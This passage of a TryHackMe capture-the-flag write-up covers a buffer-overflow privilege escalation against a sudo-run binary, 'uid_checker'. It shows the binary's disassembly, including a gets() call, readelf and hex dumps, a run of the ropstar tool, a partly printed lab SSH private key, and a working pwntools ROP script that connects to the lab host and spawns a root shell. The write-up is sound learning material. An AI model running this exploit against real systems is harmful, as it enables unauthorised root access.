  40052e:	74 02                	je     400532 <_init+0x12>
  400530:	ff d0                	callq  *%rax
  400532:	48 83 c4 08          	add    $0x8,%rsp
  400536:	c3                   	retq   

Disassembly of section .plt:

0000000000400540 <.plt>:
  400540:	ff 35 c2 0a 20 00    	pushq  0x200ac2(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400546:	ff 25 c4 0a 20 00    	jmpq   *0x200ac4(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40054c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400550 <puts@plt>:
  400550:	ff 25 c2 0a 20 00    	jmpq   *0x200ac2(%rip)        # 601018 <puts@GLIBC_2.2.5>
  400556:	68 00 00 00 00       	pushq  $0x0
  40055b:	e9 e0 ff ff ff       	jmpq   400540 <.plt>

0000000000400560 <getuid@plt>:
  400560:	ff 25 ba 0a 20 00    	jmpq   *0x200aba(%rip)        # 601020 <getuid@GLIBC_2.2.5>
  400566:	68 01 00 00 00       	pushq  $0x1
  40056b:	e9 d0 ff ff ff       	jmpq   400540 <.plt>

0000000000400570 <system@plt>:
  400570:	ff 25 b2 0a 20 00    	jmpq   *0x200ab2(%rip)        # 601028 <system@GLIBC_2.2.5>
  400576:	68 02 00 00 00       	pushq  $0x2
  40057b:	e9 c0 ff ff ff       	jmpq   400540 <.plt>

0000000000400580 <printf@plt>:
  400580:	ff 25 aa 0a 20 00    	jmpq   *0x200aaa(%rip)        # 601030 <printf@GLIBC_2.2.5>
  400586:	68 03 00 00 00       	pushq  $0x3
  40058b:	e9 b0 ff ff ff       	jmpq   400540 <.plt>

0000000000400590 <strcmp@plt>:
  400590:	ff 25 a2 0a 20 00    	jmpq   *0x200aa2(%rip)        # 601038 <strcmp@GLIBC_2.2.5>
  400596:	68 04 00 00 00       	pushq  $0x4
  40059b:	e9 a0 ff ff ff       	jmpq   400540 <.plt>

00000000004005a0 <getgid@plt>:
  4005a0:	ff 25 9a 0a 20 00    	jmpq   *0x200a9a(%rip)        # 601040 <getgid@GLIBC_2.2.5>
  4005a6:	68 05 00 00 00       	pushq  $0x5
  4005ab:	e9 90 ff ff ff       	jmpq   400540 <.plt>

00000000004005b0 <gets@plt>:
  4005b0:	ff 25 92 0a 20 00    	jmpq   *0x200a92(%rip)        # 601048 <gets@GLIBC_2.2.5>
  4005b6:	68 06 00 00 00       	pushq  $0x6
  4005bb:	e9 80 ff ff ff       	jmpq   400540 <.plt>

Disassembly of section .text:

00000000004005c0 <_start>:
  4005c0:	31 ed                	xor    %ebp,%ebp
  4005c2:	49 89 d1             	mov    %rdx,%r9
  4005c5:	5e                   	pop    %rsi
  4005c6:	48 89 e2             	mov    %rsp,%rdx
  4005c9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  4005cd:	50                   	push   %rax
  4005ce:	54                   	push   %rsp
  4005cf:	49 c7 c0 10 08 40 00 	mov    $0x400810,%r8
  4005d6:	48 c7 c1 a0 07 40 00 	mov    $0x4007a0,%rcx
  4005dd:	48 c7 c7 c6 06 40 00 	mov    $0x4006c6,%rdi
  4005e4:	ff 15 06 0a 20 00    	callq  *0x200a06(%rip)        # 600ff0 <__libc_start_main@GLIBC_2.2.5>
  4005ea:	f4                   	hlt    
  4005eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

00000000004005f0 <_dl_relocate_static_pie>:
  4005f0:	f3 c3                	repz retq 
  4005f2:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  4005f9:	00 00 00 
  4005fc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400600 <deregister_tm_clones>:
  400600:	55                   	push   %rbp
  400601:	b8 60 10 60 00       	mov    $0x601060,%eax
  400606:	48 3d 60 10 60 00    	cmp    $0x601060,%rax
  40060c:	48 89 e5             	mov    %rsp,%rbp
  40060f:	74 17                	je     400628 <deregister_tm_clones+0x28>
  400611:	b8 00 00 00 00       	mov    $0x0,%eax
  400616:	48 85 c0             	test   %rax,%rax
  400619:	74 0d                	je     400628 <deregister_tm_clones+0x28>
  40061b:	5d                   	pop    %rbp
  40061c:	bf 60 10 60 00       	mov    $0x601060,%edi
  400621:	ff e0                	jmpq   *%rax
  400623:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  400628:	5d                   	pop    %rbp
  400629:	c3                   	retq   
  40062a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400630 <register_tm_clones>:
  400630:	be 60 10 60 00       	mov    $0x601060,%esi
  400635:	55                   	push   %rbp
  400636:	48 81 ee 60 10 60 00 	sub    $0x601060,%rsi
  40063d:	48 89 e5             	mov    %rsp,%rbp
  400640:	48 c1 fe 03          	sar    $0x3,%rsi
  400644:	48 89 f0             	mov    %rsi,%rax
  400647:	48 c1 e8 3f          	shr    $0x3f,%rax
  40064b:	48 01 c6             	add    %rax,%rsi
  40064e:	48 d1 fe             	sar    %rsi
  400651:	74 15                	je     400668 <register_tm_clones+0x38>
  400653:	b8 00 00 00 00       	mov    $0x0,%eax
  400658:	48 85 c0             	test   %rax,%rax
  40065b:	74 0b                	je     400668 <register_tm_clones+0x38>
  40065d:	5d                   	pop    %rbp
  40065e:	bf 60 10 60 00       	mov    $0x601060,%edi
  400663:	ff e0                	jmpq   *%rax
  400665:	0f 1f 00             	nopl   (%rax)
  400668:	5d                   	pop    %rbp
  400669:	c3                   	retq   
  40066a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000000400670 <__do_global_dtors_aux>:
  400670:	80 3d e9 09 20 00 00 	cmpb   $0x0,0x2009e9(%rip)        # 601060 <__TMC_END__>
  400677:	75 17                	jne    400690 <__do_global_dtors_aux+0x20>
  400679:	55                   	push   %rbp
  40067a:	48 89 e5             	mov    %rsp,%rbp
  40067d:	e8 7e ff ff ff       	callq  400600 <deregister_tm_clones>
  400682:	c6 05 d7 09 20 00 01 	movb   $0x1,0x2009d7(%rip)        # 601060 <__TMC_END__>
  400689:	5d                   	pop    %rbp
  40068a:	c3                   	retq   
  40068b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  400690:	f3 c3                	repz retq 
  400692:	0f 1f 40 00          	nopl   0x0(%rax)
  400696:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40069d:	00 00 00 

00000000004006a0 <frame_dummy>:
  4006a0:	55                   	push   %rbp
  4006a1:	48 89 e5             	mov    %rsp,%rbp
  4006a4:	5d                   	pop    %rbp
  4006a5:	eb 89                	jmp    400630 <register_tm_clones>

00000000004006a7 <secret>:
  4006a7:	55                   	push   %rbp
  4006a8:	48 89 e5             	mov    %rsp,%rbp
  4006ab:	48 8d 3d 76 01 00 00 	lea    0x176(%rip),%rdi        # 400828 <_IO_stdin_used+0x8>
  4006b2:	e8 99 fe ff ff       	callq  400550 <puts@plt>
  4006b7:	48 8d 3d 82 01 00 00 	lea    0x182(%rip),%rdi        # 400840 <_IO_stdin_used+0x20>
  4006be:	e8 ad fe ff ff       	callq  400570 <system@plt>
  4006c3:	90                   	nop
  4006c4:	5d                   	pop    %rbp
  4006c5:	c3                   	retq   

00000000004006c6 <main>:
  4006c6:	55                   	push   %rbp
  4006c7:	48 89 e5             	mov    %rsp,%rbp
  4006ca:	48 83 ec 60          	sub    $0x60,%rsp
  4006ce:	89 7d ac             	mov    %edi,-0x54(%rbp)
  4006d1:	48 89 75 a0          	mov    %rsi,-0x60(%rbp)
  4006d5:	48 8d 3d 6c 01 00 00 	lea    0x16c(%rip),%rdi        # 400848 <_IO_stdin_used+0x28>
  4006dc:	e8 6f fe ff ff       	callq  400550 <puts@plt>
  4006e1:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  4006e5:	48 89 c7             	mov    %rax,%rdi
  4006e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4006ed:	e8 be fe ff ff       	callq  4005b0 <gets@plt>
  4006f2:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  4006f6:	48 8d 35 9e 01 00 00 	lea    0x19e(%rip),%rsi        # 40089b <_IO_stdin_used+0x7b>
  4006fd:	48 89 c7             	mov    %rax,%rdi
  400700:	e8 8b fe ff ff       	callq  400590 <strcmp@plt>
  400705:	85 c0                	test   %eax,%eax
  400707:	75 25                	jne    40072e <main+0x68>
  400709:	b8 00 00 00 00       	mov    $0x0,%eax
  40070e:	e8 4d fe ff ff       	callq  400560 <getuid@plt>
  400713:	89 45 f8             	mov    %eax,-0x8(%rbp)
  400716:	8b 45 f8             	mov    -0x8(%rbp),%eax
  400719:	89 c6                	mov    %eax,%esi
  40071b:	48 8d 3d 7b 01 00 00 	lea    0x17b(%rip),%rdi        # 40089d <_IO_stdin_used+0x7d>
  400722:	b8 00 00 00 00       	mov    $0x0,%eax
  400727:	e8 54 fe ff ff       	callq  400580 <printf@plt>
  40072c:	eb 6e                	jmp    40079c <main+0xd6>
  40072e:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  400732:	48 8d 35 75 01 00 00 	lea    0x175(%rip),%rsi        # 4008ae <_IO_stdin_used+0x8e>
  400739:	48 89 c7             	mov    %rax,%rdi
  40073c:	e8 4f fe ff ff       	callq  400590 <strcmp@plt>
  400741:	85 c0                	test   %eax,%eax
  400743:	75 25                	jne    40076a <main+0xa4>
  400745:	b8 00 00 00 00       	mov    $0x0,%eax
  40074a:	e8 51 fe ff ff       	callq  4005a0 <getgid@plt>
  40074f:	89 45 fc             	mov    %eax,-0x4(%rbp)
  400752:	8b 45 fc             	mov    -0x4(%rbp),%eax
  400755:	89 c6                	mov    %eax,%esi
  400757:	48 8d 3d 52 01 00 00 	lea    0x152(%rip),%rdi        # 4008b0 <_IO_stdin_used+0x90>
  40075e:	b8 00 00 00 00       	mov    $0x0,%eax
  400763:	e8 18 fe ff ff       	callq  400580 <printf@plt>
  400768:	eb 32                	jmp    40079c <main+0xd6>
  40076a:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  40076e:	48 8d 35 53 01 00 00 	lea    0x153(%rip),%rsi        # 4008c8 <_IO_stdin_used+0xa8>
  400775:	48 89 c7             	mov    %rax,%rdi
  400778:	e8 13 fe ff ff       	callq  400590 <strcmp@plt>
  40077d:	85 c0                	test   %eax,%eax
  40077f:	75 0e                	jne    40078f <main+0xc9>
  400781:	48 8d 3d 68 01 00 00 	lea    0x168(%rip),%rdi        # 4008f0 <_IO_stdin_used+0xd0>
  400788:	e8 c3 fd ff ff       	callq  400550 <puts@plt>
  40078d:	eb 0d                	jmp    40079c <main+0xd6>
  40078f:	48 8d 3d 9a 01 00 00 	lea    0x19a(%rip),%rdi        # 400930 <_IO_stdin_used+0x110>
  400796:	e8 b5 fd ff ff       	callq  400550 <puts@plt>
  40079b:	90                   	nop
  40079c:	c9                   	leaveq 
  40079d:	c3                   	retq   
  40079e:	66 90                	xchg   %ax,%ax

00000000004007a0 <__libc_csu_init>:
  4007a0:	41 57                	push   %r15
  4007a2:	41 56                	push   %r14
  4007a4:	49 89 d7             	mov    %rdx,%r15
  4007a7:	41 55                	push   %r13
  4007a9:	41 54                	push   %r12
  4007ab:	4c 8d 25 5e 06 20 00 	lea    0x20065e(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  4007b2:	55                   	push   %rbp
  4007b3:	48 8d 2d 5e 06 20 00 	lea    0x20065e(%rip),%rbp        # 600e18 <__do_global_dtors_aux_fini_array_entry>
  4007ba:	53                   	push   %rbx
  4007bb:	41 89 fd             	mov    %edi,%r13d
  4007be:	49 89 f6             	mov    %rsi,%r14
  4007c1:	4c 29 e5             	sub    %r12,%rbp
  4007c4:	48 83 ec 08          	sub    $0x8,%rsp
  4007c8:	48 c1 fd 03          	sar    $0x3,%rbp
  4007cc:	e8 4f fd ff ff       	callq  400520 <_init>
  4007d1:	48 85 ed             	test   %rbp,%rbp
  4007d4:	74 20                	je     4007f6 <__libc_csu_init+0x56>
  4007d6:	31 db                	xor    %ebx,%ebx
  4007d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4007df:	00 
  4007e0:	4c 89 fa             	mov    %r15,%rdx
  4007e3:	4c 89 f6             	mov    %r14,%rsi
  4007e6:	44 89 ef             	mov    %r13d,%edi
  4007e9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  4007ed:	48 83 c3 01          	add    $0x1,%rbx
  4007f1:	48 39 dd             	cmp    %rbx,%rbp
  4007f4:	75 ea                	jne    4007e0 <__libc_csu_init+0x40>
  4007f6:	48 83 c4 08          	add    $0x8,%rsp
  4007fa:	5b                   	pop    %rbx
  4007fb:	5d                   	pop    %rbp
  4007fc:	41 5c                	pop    %r12
  4007fe:	41 5d                	pop    %r13
  400800:	41 5e                	pop    %r14
  400802:	41 5f                	pop    %r15
  400804:	c3                   	retq   
  400805:	90                   	nop
  400806:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40080d:	00 00 00 

0000000000400810 <__libc_csu_fini>:
  400810:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000400814 <_fini>:
  400814:	48 83 ec 08          	sub    $0x8,%rsp
  400818:	48 83 c4 08          	add    $0x8,%rsp
  40081c:	c3                   	retq   

```

<br>


<br>

```bash
dave@daves-blog:/$ readelf -h uid_checker
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x4005c0
  Start of program headers:          64 (bytes into file)
  Start of section headers:          6712 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         29
  Section header string table index: 28
```

<br>

```bash
dave@daves-blog:/$ xxd uid_checker | more
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0200 3e00 0100 0000 c005 4000 0000 0000  ..>.......@.....
00000020: 4000 0000 0000 0000 381a 0000 0000 0000  @.......8.......
00000030: 0000 0000 4000 3800 0900 4000 1d00 1c00  ....@.8...@.....
00000040: 0600 0000 0400 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 4000 0000 0000 4000 4000 0000 0000  @.@.....@.@.....
00000060: f801 0000 0000 0000 f801 0000 0000 0000  ................
00000070: 0800 0000 0000 0000 0300 0000 0400 0000  ................
00000080: 3802 0000 0000 0000 3802 4000 0000 0000  8.......8.@.....
00000090: 3802 4000 0000 0000 1c00 0000 0000 0000  8.@.............
000000a0: 1c00 0000 0000 0000 0100 0000 0000 0000  ................
000000b0: 0100 0000 0500 0000 0000 0000 0000 0000  ................
000000c0: 0000 4000 0000 0000 0000 4000 0000 0000  ..@.......@.....


....
00000230: 0100 0000 0000 0000 2f6c 6962 3634 2f6c  ......../lib64/l
00000240: 642d 6c69 6e75 782d 7838 362d 3634 2e73  d-linux-x86-64.s



...
000003a0: 0000 0000 0000 0000 006c 6962 632e 736f  .........libc.so
000003b0: 2e36 0067 6574 7300 7075 7473 0070 7269  .6.gets.puts.pri
000003c0: 6e74 6600 6765 7467 6964 0073 7973 7465  ntf.getgid.syste
000003d0: 6d00 6765 7475 6964 0073 7472 636d 7000  m.getuid.strcmp.
000003e0: 5f5f 6c69 6263 5f73 7461 7274 5f6d 6169  __libc_start_mai
000003f0: 6e00 474c 4942 435f 322e 322e 3500 5f5f  n.GLIBC_2.2.5.__
00000400: 676d 6f6e 5f73 7461 7274 5f5f 0000 0000  gmon_start__....

...
00001060: 4743 433a 2028 5562 756e 7475 2037 2e35  GCC: (Ubuntu 7.5
00001070: 2e30 2d33 7562 756e 7475 317e 3138 2e30  .0-3ubuntu1~18.0
00001080: 3429 2037 2e35 2e30 0000 0000 0000 0000  4) 7.5.0........
...
000016e0: 2005 4000 0000 0000 0000 0000 0000 0000   .@.............
000016f0: 0063 7274 7374 7566 662e 6300 6465 7265  .crtstuff.c.dere
00001700: 6769 7374 6572 5f74 6d5f 636c 6f6e 6573  gister_tm_clones
00001710: 005f 5f64 6f5f 676c 6f62 616c 5f64 746f  .__do_global_dto
00001720: 7273 5f61 7578 0063 6f6d 706c 6574 6564  rs_aux.completed
00001730: 2e37 3639 3800 5f5f 646f 5f67 6c6f 6261  .7698.__do_globa
00001740: 6c5f 6474 6f72 735f 6175 785f 6669 6e69  l_dtors_aux_fini
00001750: 5f61 7272 6179 5f65 6e74 7279 0066 7261  _array_entry.fra
00001760: 6d65 5f64 756d 6d79 005f 5f66 7261 6d65  me_dummy.__frame
00001770: 5f64 756d 6d79 5f69 6e69 745f 6172 7261  _dummy_init_arra
00001780: 795f 656e 7472 7900 7569 642e 6300 5f5f  y_entry.uid.c.__
00001790: 4652 414d 455f 454e 445f 5f00 5f5f 696e  FRAME_END__.__in
000017a0: 6974 5f61 7272 6179 5f65 6e64 005f 4459  it_array_end._DY
000017b0: 4e41 4d49 4300 5f5f 696e 6974 5f61 7272  NAMIC.__init_arr
000017c0: 6179 5f73 7461 7274 005f 5f47 4e55 5f45  ay_start.__GNU_E
000017d0: 485f 4652 414d 455f 4844 5200 5f47 4c4f  H_FRAME_HDR._GLO
000017e0: 4241 4c5f 4f46 4653 4554 5f54 4142 4c45  BAL_OFFSET_TABLE
000017f0: 5f00 5f5f 6c69 6263 5f63 7375 5f66 696e  _.__libc_csu_fin
00001800: 6900 7075 7473 4040 474c 4942 435f 322e  i.puts@@GLIBC_2.
00001810: 322e 3500 5f65 6461 7461 0067 6574 7569  2.5._edata.getui
00001820: 6440 4047 4c49 4243 5f32 2e32 2e35 0073  d@@GLIBC_2.2.5.s
00001830: 7973 7465 6d40 4047 4c49 4243 5f32 2e32  ystem@@GLIBC_2.2
00001840: 2e35 0070 7269 6e74 6640 4047 4c49 4243  .5.printf@@GLIBC
00001850: 5f32 2e32 2e35 005f 5f6c 6962 635f 7374  _2.2.5.__libc_st
00001860: 6172 745f 6d61 696e 4040 474c 4942 435f  art_main@@GLIBC_
00001870: 322e 322e 3500 5f5f 6461 7461 5f73 7461  2.2.5.__data_sta
00001880: 7274 0073 7472 636d 7040 4047 4c49 4243  rt.strcmp@@GLIBC
00001890: 5f32 2e32 2e35 005f 5f67 6d6f 6e5f 7374  _2.2.5.__gmon_st
000018a0: 6172 745f 5f00 5f5f 6473 6f5f 6861 6e64  art__.__dso_hand
000018b0: 6c65 005f 494f 5f73 7464 696e 5f75 7365  le._IO_stdin_use
000018c0: 6400 6765 7467 6964 4040 474c 4942 435f  d.getgid@@GLIBC_
000018d0: 322e 322e 3500 6765 7473 4040 474c 4942  2.2.5.gets@@GLIB
000018e0: 435f 322e 322e 3500 7365 6372 6574 005f  C_2.2.5.secret._
000018f0: 5f6c 6962 635f 6373 755f 696e 6974 005f  _libc_csu_init._
00001900: 646c 5f72 656c 6f63 6174 655f 7374 6174  dl_relocate_stat
00001910: 6963 5f70 6965 005f 5f62 7373 5f73 7461  ic_pie.__bss_sta
00001920: 7274 006d 6169 6e00 5f5f 544d 435f 454e  rt.main.__TMC_EN
00001930: 445f 5f00 002e 7379 6d74 6162 002e 7374  D__...symtab..st
00001940: 7274 6162 002e 7368 7374 7274 6162 002e  rtab..shstrtab..
00001950: 696e 7465 7270 002e 6e6f 7465 2e41 4249  interp..note.ABI
00001960: 2d74 6167 002e 6e6f 7465 2e67 6e75 2e62  -tag..note.gnu.b
00001970: 7569 6c64 2d69 6400 2e67 6e75 2e68 6173  uild-id..gnu.has
00001980: 6800 2e64 796e 7379 6d00 2e64 796e 7374  h..dynsym..dynst
00001990: 7200 2e67 6e75 2e76 6572 7369 6f6e 002e  r..gnu.version..
000019a0: 676e 752e 7665 7273 696f 6e5f 7200 2e72  gnu.version_r..r
000019b0: 656c 612e 6479 6e00 2e72 656c 612e 706c  ela.dyn..rela.pl
000019c0: 7400 2e69 6e69 7400 2e74 6578 7400 2e66  t..init..text..f
000019d0: 696e 6900 2e72 6f64 6174 6100 2e65 685f  ini..rodata..eh_
000019e0: 6672 616d 655f 6864 7200 2e65 685f 6672  frame_hdr..eh_fr
000019f0: 616d 6500 2e69 6e69 745f 6172 7261 7900  ame..init_array.
00001a00: 2e66 696e 695f 6172 7261 7900 2e64 796e  .fini_array..dyn
00001a10: 616d 6963 002e 676f 7400 2e67 6f74 2e70  amic..got..got.p
00001a20: 6c74 002e 6461 7461 002e 6273 7300 2e63  lt..data..bss..c
00001a30: 6f6d 6d65 6e74 0000 0000 0000 0000 0000  omment..........
```


<br>

```bash
:~/DavesBlog# git clone https://github.com/xct/ropstar
...
:~/DavesBlog# ls
crazybinary  exploit.py  id_rsa  id_rsa.pub  import.py  rockstar-py  roper.py  ROPgadget  ropstar  uid_checker
:~/DavesBlog# cd ropstar
~/DavesBlog/ropstar# ls
README.md  requirements.txt  ropstar  ropstar.py
:~/DavesBlog/ropstar# pip3 install -r requirements.txt
...
Successfully built pwn
Installing collected packages: pwn
Successfully installed pwn-1.0
...
```

<br>


```bash
:~/DavesBlog/ropstar# chmod +x ropstar.py
```

<br>

```bash
:~/DavesBlog/ropstar# python3 ropstar.py crazybinary

                          __            
   _________  ____  _____/ /_____ ______
  / ___/ __ \/ __ \/ ___/ __/ __ `/ ___/  
 / /  / /_/ / /_/ (__  ) /_/ /_/ / /    
/_/   \____/ .___/____/\__/\__,_/_/     
          /_/                           
                  xct@vulndev.io | v0.2                                 
    
...
[DEBUG] Sent 0x7d1 bytes:
    b'aaaabaaacaaadaaaeaaafaaa.........acvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaah
...
```

<br>

<img width="597" height="443" alt="image" src="https://github.com/user-attachments/assets/dd8ff09a-72f1-47c8-9d8d-75d3db6ff5e1" />

<br>
<br>

<img width="1222" height="695" alt="image" src="https://github.com/user-attachments/assets/06a8d99c-27bf-40b7-b09d-79551bafea43" />

<br>
<br>

<img width="1220" height="688" alt="image" src="https://github.com/user-attachments/assets/8fd3a761-1011-4eba-982d-95d953147536" />

<br>
<br>

<img width="1212" height="695" alt="image" src="https://github.com/user-attachments/assets/9fad0cf7-55ce-4962-88fb-aa1644bdac77" />


```bash
dave@daves-blog:~$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/dave/.ssh/id_rsa): 
Created directory '/home/dave/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/dave/.ssh/id_rsa.
Your public key has been saved in /home/dave/.ssh/id_rsa.pub.
...
dave@daves-blog:~$ cd /home/dave/.ssh
dave@daves-blog:~/.ssh$ ls
id_rsa  id_rsa.pub
dave@daves-blog:~$ cd /home/dave/.ssh
dave@daves-blog:~/.ssh$ ls
id_rsa  id_rsa.pub
dave@daves-blog:~/.ssh$ ls
id_rsa  id_rsa.pub
dave@daves-blog:~/.ssh$ ls -lah
total 16K
drwx------ 2 dave dave 4.0K Aug 16 19:26 .
drwxr-xr-x 6 dave dave 4.0K Aug 16 19:26 ..
-rw------- 1 dave dave 1.7K Aug 16 19:26 id_rsa
-rw-r--r-- 1 dave dave  397 Aug 16 19:26 id_rsa.pub
dave@daves-blog:~/.ssh$ cp id_rsa.pub authorized_keys
dave@daves-blog:~/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
dave@daves-blog:~/.ssh$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAv32Ey7yB6TEjWgaIHyA/HEqVamMltS9CewsV8Vlhv+P2Ubcg
ikJyuKyCaQAW0wi8U7c1HiXMME/0voMvXlO5wKIfVHfNIDgrXxVKuGb896Mu898R
...
KR5HrcmcZzFK4kSMUX4Wo1CKo+ghwjGSIFEZ9LQVyEu5EU9V+RaLSkGb8IGtQ1z8
WHZIf0DaGegNF+oWd/z6OJyOPCKC15wERdbAeVnZsIznc0onUSJe1PY=
-----END RSA PRIVATE KEY-----
```

```bash
:~/DavesBlog# nano id_rsa
```


<br>

```bash
:~/DavesBlog# cat roper.py

#!/usr/bin/env python3

from pwn import *

offset = 88
payload = cyclic(offset)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x4005b0)
payload += p64(0x400803) # pop rdi; ret
payload += p64(0x601060) # [arg0] rdi = 6295648
payload += p64(0x400570)

s = ssh(host='10.201.13.209', user='dave', keyfile='./id_rsa')
p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive()
```

<br>
<br>


<img width="1112" height="308" alt="image" src="https://github.com/user-attachments/assets/8e838789-cf6a-4702-a2e1-37b20da1351f" />

<br>
<br>

<img width="1110" height="362" alt="image" src="https://github.com/user-attachments/assets/c4b7c15f-e886-4e89-92c3-9f1e8d4287fa" />

<br>
<br>

<h1>Completed</h1>


<img width="1895" height="928" alt="image" src="https://github.com/user-attachments/assets/14302f19-63b4-4e11-99f8-efdbc4f7ec17" />

<br>

<img width="1879" height="932" alt="image" src="https://github.com/user-attachments/assets/3ff04c58-297f-40cd-aae9-6eb53712cfc2" />


<br>

<h1 align="center">My TryHackMe Journey</h1>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 16   |   467    |     120ᵗʰ    |      5ᵗʰ     |     328ᵗʰ   |     6ᵗʰ    | 121,636  |    920    |    73     |


</div>

<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/f322d36a-f4f3-400e-a5ab-04d6e864a77f" />

<img width="1879" height="937" alt="image" src="https://github.com/user-attachments/assets/5579bc1c-e97c-4176-8a8d-9c87676018a5" />

<img width="1863" height="931" alt="image" src="https://github.com/user-attachments/assets/9224b320-5932-486d-b4b5-5db4fde7c894" />

<img width="1879" height="931" alt="image" src="https://github.com/user-attachments/assets/a0702055-5520-4f7d-93d6-a0f96a695cd1" />

<img width="1878" height="940" alt="image" src="https://github.com/user-attachments/assets/26122229-3120-40b4-86d5-e64e2914aaea" />
